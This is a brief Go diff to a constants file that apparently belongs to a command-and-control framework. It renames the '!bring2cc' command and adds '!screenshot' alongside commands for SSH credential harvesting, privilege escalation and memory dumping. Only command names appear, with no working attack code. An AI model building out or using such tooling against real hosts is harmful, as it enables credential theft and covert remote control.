@@ -16,10 +16,11 @@ const (
 	C2CmdSSHD           = "!sshd"
 	C2CmdSSHHarvester   = "!ssh_harvester"
 	C2CmdLPE            = "!lpe"
-	C2CmdBring2CC       = "!" + ModBring2CC
+	C2CmdBring2CC       = "!bring2cc"
 	C2CmdStat           = "!stat"
 	C2CmdListener       = "!listener"
 	C2CmdFileServer     = "!file_server"
 	C2CmdFileDownloader = "!file_downloader"
 	C2CmdMemDump        = "!mem_dump"
+	C2CmdScreenshot     = "!screenshot"
 )
